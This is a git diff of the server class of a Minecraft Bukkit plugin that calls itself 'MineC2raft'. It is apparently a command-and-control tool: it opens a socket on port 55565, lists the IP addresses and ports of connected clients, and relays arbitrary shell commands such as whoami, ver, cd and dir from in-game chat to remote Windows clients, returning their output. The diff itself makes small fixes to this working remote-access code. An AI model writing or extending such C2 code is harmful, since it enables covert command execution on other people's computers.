@@ -17,6 +17,7 @@ import org.bukkit.scheduler.BukkitTask;
  * Original Server code modified for compatibility with Bukkit API.
  * CHATGPT was used as a LEARNING TOOL in the creation of this software.
  */
+
 public class Server {
 
     //Escape codes or sommn for different colors (now changed for minecraft color coding). 
@@ -41,9 +42,8 @@ public class Server {
      */
     public Server(){
         try {
-            serverSocket = new ServerSocket(PORT);
+            serverSocket = new ServerSocket(55565);
             System.out.println(BRAND_IDENTITY + "Server Ready.");
-            exists = true;
         } catch(IOException e) {
             
             System.out.println(BRAND_IDENTITY + "Creation of server Failed. " + e);
@@ -98,12 +98,12 @@ public class Server {
         switch(cmd) {
             case "os", "version":
                 reply = "ver";
-                returnStr = broadcast(reply, null, target);
+                returnStr = broadcast(reply, sender, target);
                 break;
             case "user", "client":
                 reply = "whoami";
 
-                returnStr = broadcast(reply, null, target);
+                returnStr = broadcast(reply, sender, target);
                 break;
             case "coms", "commands", "cmds", "HELP": 
                 return "               ********** MineC2raft Commands ***********\n" 
@@ -111,9 +111,8 @@ public class Server {
                             + "/cd [client]: Change directory of specified [client].\n"
                             + "/cmd [command] [client]: Sends [command] to the specified [client].\n"
                             + "/dir [client]: List current directory of specified [client].\n"
-                            + "/credits: about the program.\n"
                             + "       ******************************************\n\n" 
-                            + "WINDOWS ONLY\n(i'll add linux soon) but like lowk you can use a remote terminal \n" 
+                            + "lowk you can use a remote terminal and send shii \n" 
                             + "Thats all you need to know foo\n";
                   
             case "poop":
@@ -129,7 +128,7 @@ public class Server {
                         + "A dud?\n/give @p oak_sapling 100";
                   return reply;               
             default: 
-                returnStr = broadcast(cmd, null, target);
+                returnStr = broadcast(cmd, sender, target);
                 break;  
         }
         return returnStr;
@@ -139,35 +138,36 @@ public class Server {
      * Broadcasts commands to all clients - if the message does not have "CMD: " at the start, the client WILL NOT interpret the message.
      * @return the String to return to the minecraft command (so you can see it show up in chat!)
      */
-    public static String broadcast(String msg, ClientHandler sender, String response) {
+    public static String broadcast(String msg, CommandSender sender, String target) {
 
-        if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
+        if(msg == null || msg.trim().isEmpty() || msg.equals("__END__\n")) {
             
         }
         if(clients.isEmpty()) {
             System.out.println(BRAND_IDENTITY + RED + "No clients connected." + RESET);
         }
 
-        if(response != null) {
-            if(response.equals("all")) {
+        if(target != null) {
+            if(target.equals("all")) {
                 for(ClientHandler client : clients) {
-                    if (client != sender) {
+                    if (client != sender) { //shouldn't be the case ever anymore, but just to be sure...
                         client.sendMessage("CMD: " + msg);
                     }
                 }
+                return BRAND_IDENTITY + "All clients recieved command.";
             } else {
                 try {
-                    int destination = Integer.parseInt(response);
+                    int destination = Integer.parseInt(target);
                     clients.get(destination).sendMessage("CMD: " + msg);
                     try {
                         return clients.get(destination).waitForBroadcast();
-                    } catch(InterruptedException e) { return null;}
+                    } catch(InterruptedException e) { return BRAND_IDENTITY + "ERROR IN GETTING CLIENTS";}
                 } catch(Exception e) {
                     System.out.println("Invalid Target!");
                 }
             }
         }
-        return null;
+        return BRAND_IDENTITY + "ERROR BROADCASTING!";
     }
 
     /**
@@ -176,10 +176,10 @@ public class Server {
     public static String formatArrLst() {
         String arr = BRAND_IDENTITY;
         if(clients.size() == 0) {
-            arr += RED + "No connected clients. " + RESET + "\n";
+            arr += BRAND_IDENTITY + RED + "No connected clients. " + RESET + "\n";
             return arr;
         } else {
-            arr += GREEN + "\nCurrent Connected Clients:" + RESET + "\n";
+            arr += BRAND_IDENTITY + GREEN + "\nCurrent Connected Clients:" + RESET + "\n";
             for(int i = 0; i < clients.size(); i++) {
                 arr += YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort() + "\n";
             }
@@ -196,7 +196,7 @@ public class Server {
     public static boolean isEnabled() {
         return exists;
     }
-
+    
     public static void stopServer() {
         try {
             serverSocket.close();
